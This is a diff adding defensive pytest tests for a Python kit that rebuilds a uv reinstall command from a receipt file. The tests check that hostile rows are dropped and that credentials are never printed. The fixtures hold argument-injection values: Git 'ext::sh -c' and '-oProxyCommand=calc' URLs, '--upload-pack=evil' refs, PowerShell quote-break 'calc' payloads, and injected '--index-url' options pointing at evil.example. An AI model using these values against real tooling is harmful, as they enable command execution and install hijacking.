@@ -7,6 +7,7 @@ here touches the network or the kit's own checkout.
 """
 from __future__ import annotations
 
+import importlib.util
 import json
 import os
 import subprocess
@@ -268,6 +269,188 @@ def test_packages_from_folders_files_urls_and_git_come_back_from_their_source(tm
                                        "they came): ed-extras, url-query, git-lfs, rel-dir, named-index\n")
 
 
+# Hand-edited rows (#808): uv writes none of these. Each would turn the rebuilt `--with` word into something else: a URL
+# requirement through the specifier or an extra, a Git remote helper that runs a command, a marker that is not one, a
+# control character in the printed hint. The reinstall leaves each out and names it, as it does an unreadable row.
+EDITED = """[tool]
+requirements = [
+    { name = "cad-agent", editable = "/k/cad-agent", extras = ["cad"] },
+    { name = "kept", extras = ["socks"], specifier = ">=2", marker = "python_version >= '3'" },
+    { name = "spec-url", specifier = " @ https://example.invalid/evil-0.1-py3-none-any.whl" },
+    { name = "spec-junk", specifier = ">=1 --index-url https://example.invalid" },
+    { name = "extra-url", extras = ["x] @ https://example.invalid/e.whl ; python_version>'0'"] },
+    { name = "extra-empty", extras = [""] },
+    { name = "marker-junk", specifier = ">=1", marker = "python_version >= '3' @ https://example.invalid" },
+    { name = "git-ext", git = "ext::sh -c touch% /tmp/pwned" },
+    { name = "git-plus-ext", git = "git+ext::sh -c touch% /tmp/pwned" },
+    { name = "git-fd", git = "fd::17" },
+    { name = "git-no-host", git = "https:///r?rev=v1" },
+    { name = "control", directory = "/src/a\\u001b[31mred" },
+    { name = "git-ssh", git = "ssh://git@example.org/r?tag=v2" },
+]
+"""
+
+
+def test_hand_edited_receipt_rows_are_left_out_and_named(tmp_path, monkeypatch, capsys):
+    (tmp_path / "uv-receipt.toml").write_text(EDITED)
+    monkeypatch.setattr(agentkit.sys, "prefix", str(tmp_path))
+    args, dropped = agentkit._receipt_with()
+    assert args == ["--with", "kept[socks]>=2; python_version >= '3'",
+                    "--with", "git-ssh @ git+ssh://git@example.org/r@v2"]
+    assert dropped == ["spec-url", "spec-junk", "extra-url", "extra-empty", "marker-junk", "git-ext", "git-plus-ext",
+                       "git-fd", "git-no-host", "control"]
+    monkeypatch.setattr(agentkit.shutil, "which", lambda name, path=None: "/u/bin/uv")
+    monkeypatch.setattr(agentkit, "_uv_tool_env", lambda: True)
+    cmd = agentkit.reinstall_command(Path("/k/cad-agent"), ["cad"])
+    assert cmd[-len(args):] == args and not any("example.invalid" in w or "ext::" in w for w in cmd)
+    assert "spec-url, spec-junk, extra-url" in capsys.readouterr().err
+
+
+# What uv 0.11.32 writes for `--with 'credpkg @ http://user:token@host/credpkg-0.1.0-py2.py3-none-any.whl'`: the URL as
+# given, credentials and all (checked in a scratch tool install against a local server that asks for basic auth, #808).
+# For `--with 'credpkg @ git+http://user:token@host/credpkg.git@main'` it wrote `git = "http://host/credpkg.git?rev=main"`:
+# a Git row's credentials are stripped. The other rows are hand-edited.
+CREDENTIALS = """[tool]
+requirements = [
+    { name = "cad-agent", editable = "/k/cad-agent", extras = ["cad"] },
+    { name = "credpkg", url = "http://user:dummytoken@127.0.0.1:8765/credpkg-0.1.0-py2.py3-none-any.whl" },
+    { name = "tokpkg", url = "https://dummytoken@example.org/tokpkg-0.1.0-py3-none-any.whl" },
+    { name = "gitcred", git = "https://user:dummytoken@example.org/r?rev=v1" },
+    { name = "gitssh", git = "ssh://git:dummytoken@example.org/r" },
+    { url = "https://user:dummytoken@example.org/nameless.whl" },
+    { name = "fine", url = "https://example.org/fine-0.1.0-py3-none-any.whl" },
+]
+"""
+
+
+def test_a_url_holding_credentials_is_never_printed(kit, monkeypatch, capsys):
+    """uv writes a `url` row's credentials into the receipt. The row is left out and named without its URL, so the token
+    is in neither the hint, the reinstall command (printed when it fails, or by `update --reinstall-command`), nor stderr."""
+    _, clone, _ = kit
+    receipt = clone.parent / "env"
+    receipt.mkdir()
+    (receipt / "uv-receipt.toml").write_text(CREDENTIALS)
+    monkeypatch.setattr(agentkit.sys, "prefix", str(receipt))
+    monkeypatch.setattr(agentkit.shutil, "which", lambda name, path=None: "/u/bin/uv")
+    args, dropped = agentkit._receipt_with()
+    assert args == ["--with", "fine @ https://example.org/fine-0.1.0-py3-none-any.whl"]
+    assert dropped == [f"{n} (its URL holds credentials, not shown)" for n in
+                       ("credpkg", "tokpkg", "gitcred", "gitssh", "(a row without a valid name)")]
+    monkeypatch.setattr(agentkit, "kit_root", lambda source=None: clone)
+    monkeypatch.setattr(agentkit, "installed_extras", lambda root: ["cad"])
+    assert cli.main(["update", "--reinstall-command"]) == 0
+    hint = agentkit.add_packages_command("playwright")
+    out, err = capsys.readouterr()
+    assert "fine @ https://example.org/fine-0.1.0-py3-none-any.whl" in json.loads(out) and "fine @" in hint
+    assert "dummytoken" not in out + err + hint
+    assert "credpkg (its URL holds credentials, not shown)" in err
+
+
+def test_the_310_reader_reads_requirements_only_from_the_tool_table(monkeypatch):
+    """#808: another table's `requirements = [` before [tool] is not the receipt's list (tomllib does not read it)."""
+    text = ('[other]\nrequirements = [\n    { name = "evil", specifier = "==6.6.6" },\n]\n\n[tool]\nrequirements = [\n'
+            '    { name = "cad-agent", editable = "/k", extras = ["cad"] },\n]\n')
+    wanted = [{"name": "cad-agent", "editable": "/k", "extras": ["cad"]}]
+    if importlib.util.find_spec("tomllib"):
+        import tomllib
+        assert tomllib.loads(text)["tool"]["requirements"] == wanted
+    monkeypatch.setitem(sys.modules, "tomllib", None)
+    assert agentkit._receipt_requirements(text) == wanted
+    only_other = '[other]\nrequirements = [\n    { name = "evil", specifier = "==6.6.6" },\n]\n[tool]\npython = "3.12"\n'
+    with pytest.raises(agentkit.ReceiptUnreadable):              # refused rather than guessed at
+        agentkit._receipt_requirements(only_other)
+    top = 'requirements = [\n    { name = "evil" },\n]\n[tool]\nrequirements = [\n    { name = "cad-agent", editable = "/k" },\n]\n'
+    assert agentkit._receipt_requirements(top) == [{"name": "cad-agent", "editable": "/k"}]
+
+
+def test_the_310_reader_reads_a_crlf_receipt(monkeypatch):
+    monkeypatch.setitem(sys.modules, "tomllib", None)
+    text = '[tool]\r\nrequirements = [\r\n    { name = "cad-agent", editable = "/k" },\r\n]\r\npython = "3.12"\r\n'
+    assert agentkit._receipt_requirements(text) == [{"name": "cad-agent", "editable": "/k"}]
+
+
+def test_receipt_extras_that_are_not_extra_names_are_not_used(tmp_path, monkeypatch):
+    monkeypatch.setattr(agentkit.sys, "prefix", str(tmp_path))
+    (tmp_path / "uv-receipt.toml").write_text(
+        '[tool]\nrequirements = [{ name = "cad-agent", editable = "/x", extras = ["cad] @ https://example.invalid/x"] }]\n')
+    assert agentkit._receipt_extras() is None, "the installed packages decide instead"
+
+
+# The #868 review's rows: a typographic quote PowerShell reads as `'`, a `"` that Windows PowerShell 5.1 does not
+# escape when it passes the argument on, non-ASCII where uv writes ASCII, and option-shaped Git hosts, refs and folders.
+HOSTILE = """[tool]
+requirements = [
+    { name = "u1", url = "https://h/a\u2019;calc;\u2019.whl" },
+    { name = "m2", specifier = ">=1", marker = "os_name != '\u2019; calc; \u2019'" },
+    { name = "m3", specifier = ">=1", marker = 'python_version >= "3" and os_name != " --index-url=https://evil.example/simple "' },
+    { name = "g-nonascii", git = "https://h\u00e9.example/r" },
+    { name = "m-bidi", specifier = ">=1", marker = "os_name != '\u202e'" },
+    { name = "q-editable", editable = '/src/a"b' },
+    { name = "g-ref", git = "https://h.example/r?rev=--upload-pack=evil" },
+    { name = "g-host", git = "ssh://-oProxyCommand=calc/r" },
+    { name = "g-subdir", git = "https://h.example/r?subdirectory=-x" },
+    { name = "kept", specifier = ">=1", marker = "os_name != 'nt'" },
+]
+"""
+
+
+def test_review_rows_that_could_break_a_powershell_line_are_left_out(tmp_path, monkeypatch):
+    (tmp_path / "uv-receipt.toml").write_text(HOSTILE, encoding="utf-8")
+    monkeypatch.setattr(agentkit.sys, "prefix", str(tmp_path))
+    args, dropped = agentkit._receipt_with()
+    assert args == ["--with", "kept>=1; os_name != 'nt'"]
+    assert dropped == ["u1", "m2", "m3", "g-nonascii", "m-bidi", "q-editable", "g-ref", "g-host", "g-subdir"]
+
+
+# #868 re-review: parse_qsl percent-decodes a Git row's ref and folder, so a check on the raw value misses `%22` (a `"`)
+# or `%E2%80%AE` (a bidi control) that would land in the rebuilt argument. The checks run on the rebuilt line.
+DECODED = """[tool]
+requirements = [
+    { name = "g", git = "https://h.example/r?rev=v1%22", marker = "os_name != ' --index-url=https://evil.example/simple '" },
+    { name = "g-bidi", git = "https://h.example/r?rev=v1%E2%80%AE" },
+    { name = "g-quote", git = "https://h.example/r?subdirectory=a%E2%80%99b" },
+    { name = "g-ctl", git = "https://h.example/r?tag=v1%0A--index-url=https://evil.example" },
+    { name = "g-fine", git = "https://h.example/r?rev=v1%2E2" },
+]
+"""
+
+
+def test_percent_decoded_git_query_values_are_checked_as_rebuilt(tmp_path, monkeypatch):
+    (tmp_path / "uv-receipt.toml").write_text(DECODED, encoding="utf-8")
+    monkeypatch.setattr(agentkit.sys, "prefix", str(tmp_path))
+    args, dropped = agentkit._receipt_with()
+    assert args == ["--with", "g-fine @ git+https://h.example/r@v1.2"]
+    assert dropped == ["g", "g-bidi", "g-quote", "g-ctl"]
+
+
+@pytest.mark.parametrize("quote", ["'", "\u2018", "\u2019", "\u201a", "\u201b"])
+def test_powershell_doubles_every_quote_it_reads_as_a_single_quote(quote):
+    """PowerShell opens and closes a single-quoted string with any of these (#868 review): each is doubled inside."""
+    word = f"C:\\Users\\D{quote}Angelo\\cad-agent[cad]"
+    assert agentkit._shell_line(["uv", word], windows=True) == f"uv 'C:\\Users\\D{quote}{quote}Angelo\\cad-agent[cad]'"
+
+
+@pytest.mark.parametrize("failed", [True, False])
+def test_the_update_prints_its_reinstall_command_quoted_for_the_shell(kit, monkeypatch, capsys, failed):
+    """The failure message and the Windows "finish with" line are pasted into a shell: quoted like every other hint."""
+    remote, clone, _ = kit
+    monkeypatch.setattr(agentkit, "kit_root", lambda source=None: clone)
+    monkeypatch.setattr(agentkit, "installed_extras", lambda root: [])
+    cmd = ["/u/bin/uv", "tool", "install", "--with", "idna>=3", "--with", "it\u2019s ok"]
+    monkeypatch.setattr(agentkit, "reinstall_command", lambda root, extras: cmd)
+    commit(remote, "deps", {"pyproject.toml": '[project]\nname = "cad-agent"\nversion = "0.2.0"\n'})
+    if failed:
+        monkeypatch.setattr(cli, "subprocess", types.SimpleNamespace(run=lambda c, **kw: subprocess.CompletedProcess(c, 1)))
+        assert cli.main(["update"]) == 1
+        assert "run update again to retry): /u/bin/uv tool install --with 'idna>=3' --with 'it\u2019s ok'" in \
+            capsys.readouterr().err
+    else:
+        monkeypatch.setattr(cli, "os", types.SimpleNamespace(**{**vars(os), "name": "nt"}))
+        assert cli.main(["update"]) == agentkit.REINSTALL_LATER
+        assert "finish with: /u/bin/uv tool install --with 'idna>=3' --with 'it\u2019\u2019s ok', then" in \
+            capsys.readouterr().out
+
+
 # The reviewer's receipts on which a hand-written reader and tomllib could disagree (#799 review). Each is valid TOML;
 # uv writes none of them. Without tomllib the reader either reads what tomllib reads or refuses: never something else.
 ODD_RECEIPTS = {
@@ -277,6 +460,13 @@ ODD_RECEIPTS = {
                                '    # { name = "commented", specifier = "==9" },\n]\n',
     "array of tables": '[[tool.requirements]]\nname = "cad-agent"\neditable = "/k"\n[[tool.requirements]]\nname = "x"\n',
     "nested inline table": '[tool]\nrequirements = [\n    { name = "x", index = { url = "https://example.org" } },\n]\n',
+    "multi-line string before the list": '[tool]\nnote = """\nrequirements = [\n    { name = "evil" },\n]\n"""\n'
+                                         'requirements = [\n    { name = "cad-agent", editable = "/k" },\n]\n',
+    "multi-line literal string holding a tool table": "x = '''\n[tool]\nrequirements = [\n    { name = \"evil\" },\n]\n'''\n"
+                                                      '[tool]\nrequirements = [\n    { name = "cad-agent", editable = "/k" },\n]\n',
+    "duplicate tool table": '[tool]\nrequirements = [\n    { name = "evil" },\n]\n[tool]\npython = "3.12"\n',
+    "duplicate requirements key": '[tool]\nrequirements = [\n    { name = "evil" },\n]\nrequirements = [\n'
+                                  '    { name = "cad-agent", editable = "/k" },\n]\n',
     "indented close, entrypoints after": '[tool]\nrequirements = [\n    { name = "cad-agent", editable = "/k" },\n'
                                          '    { name = "x", specifier = ">=1" },\n    ]\nentrypoints = [\n'
                                          '    { name = "cad-agent", install-path = "/b/cad-agent", from = "cad-agent" },\n]\n',
@@ -287,7 +477,10 @@ ODD_RECEIPTS = {
 def test_the_310_reader_reads_what_tomllib_reads_or_refuses(monkeypatch, case):
     text = ODD_RECEIPTS[case]
     tomllib = pytest.importorskip("tomllib")          # the reference; the fallback runs on every Python below
-    wanted = [r for r in tomllib.loads(text).get("tool", {}).get("requirements", []) if isinstance(r, dict)]
+    try:
+        wanted = [r for r in tomllib.loads(text).get("tool", {}).get("requirements", []) if isinstance(r, dict)]
+    except tomllib.TOMLDecodeError:                   # not TOML (a duplicate table or key): the reader must refuse it too
+        wanted = None
     monkeypatch.setitem(sys.modules, "tomllib", None)
     try:
         got = agentkit._receipt_requirements(text)
@@ -297,7 +490,9 @@ def test_the_310_reader_reads_what_tomllib_reads_or_refuses(monkeypatch, case):
 
 
 @pytest.mark.parametrize("case", ["brace in a string", "comment holding a table", "array of tables",
-                                  "nested inline table"])
+                                  "nested inline table", "multi-line string before the list",
+                                  "multi-line literal string holding a tool table", "duplicate tool table",
+                                  "duplicate requirements key"])
 def test_an_unreadable_receipt_gives_no_with_rows_and_says_so(tmp_path, monkeypatch, case):
     monkeypatch.setitem(sys.modules, "tomllib", None)
     with pytest.raises(agentkit.ReceiptUnreadable):
